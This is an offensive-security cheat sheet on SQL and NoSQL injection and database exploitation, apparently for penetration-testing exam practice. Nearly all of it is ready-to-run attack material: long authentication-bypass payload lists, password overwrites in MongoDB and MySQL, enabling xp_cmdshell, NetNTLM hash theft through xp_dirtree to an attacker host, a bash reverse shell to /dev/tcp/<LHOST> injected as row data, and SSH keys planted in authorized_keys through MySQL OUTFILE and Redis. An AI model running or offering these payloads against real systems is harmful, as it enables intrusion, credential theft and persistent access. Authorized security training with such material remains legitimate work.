# SQL Injection

## <mark style="color:red;">Authentication bypass</mark>

Here's the classic payload:

```
tom' or 1=1;#
```

If we do encounter errors when our payload is returning multiple rows, we can instruct the query to return a fixed number of records with the LIMIT statement:

```
tom' or 1=1 LIMIT 1;#
```

## <mark style="color:red;">Database analysis</mark>

Thanks 0xsyr0 for the [cheatsheet](https://github.com/0xsyr0/OSCP#sql-injection).

### <mark style="color:blue;">**MongoDB**</mark>

```
mongo "mongodb://localhost:27017"
```

```
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

#### <mark style="color:yellow;">**User Password Reset to "12345"**</mark>

```
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

### <mark style="color:blue;">**MSSQL**</mark>

#### <mark style="color:yellow;">**Show Database Content**</mark>

```
1> SELECT name FROM master.sys.databases
2> go
```

#### <mark style="color:yellow;">**OPENQUERY**</mark>

```
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

#### <mark style="color:yellow;">**Binary Extraction as Base64**</mark>

```
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

#### <mark style="color:yellow;">**Steal NetNTLM Hash / Relay Attack**</mark>

```
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

#### <mark style="color:yellow;">Impacket mssqlclient.py</mark>

```
impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>
./mssqlclient.py <USER>:<PASS>@<TARGET_IP>
```

### <mark style="color:blue;">**MySQL**</mark>

```
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
```

```
mysql> show databases;
mysql> use <DATABASE>;
mysql> show tables;
mysql> describe <TABLE>;
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
```

#### <mark style="color:yellow;">**Update User Password**</mark>

```
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

#### <mark style="color:yellow;">**Drop a Shell**</mark>

```
mysql> \! /bin/sh
```

#### <mark style="color:yellow;">**xp\_cmdshell**</mark>

```
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

You can also execute base 64 encoded commands:

```bash
SQL> xp_cmdshell "powershell -e <B64_PAYLOAD>" #Get the payload from https://www.revshells.com/
```

#### <mark style="color:yellow;">**Insert Code to get executed**</mark>

```
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

#### <mark style="color:yellow;">**Write SSH Key into authorized\_keys2 file**</mark>

```
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

#### <mark style="color:yellow;">**Linked SQL Server Enumeration**</mark>

```
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### <mark style="color:blue;">**NoSQL Injection**</mark>

```
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

### <mark style="color:blue;">**PostgreSQL**</mark>

```
$ psql
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

#### <mark style="color:yellow;">Common Commands</mark>

```
postgres=# \c
postgres=# \list
postgres=# \c  <DATABASE>
<DATABASE>=# \dt
<DATABASE>=# \du
<DATABASE>=# TABLE <TABLE>;
<DATABASE>=# SELECT * FROM users;
<DATABASE>=# \q
```

### <mark style="color:blue;">**Redis**</mark>

```
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

#### <mark style="color:yellow;">**Enter own SSH Key**</mark>

```
redis-cli -h <RHOST>
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

## <mark style="color:red;">**SQL Injection**</mark>

**Master List**

```
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

**Authentication Bypass**

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

**SQL Truncation Attack**

```
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

**sqlite3**

```
sqlite3 <DATABASE>.db
sqlite> .tables
sqlite> select * from users;
```

**sqsh**

```
sqsh -S <RHOST> -U <USERNAME>
```

**sqlcmd**

```
sqlcmd -S <RHOST> -U <USERNAME>
```
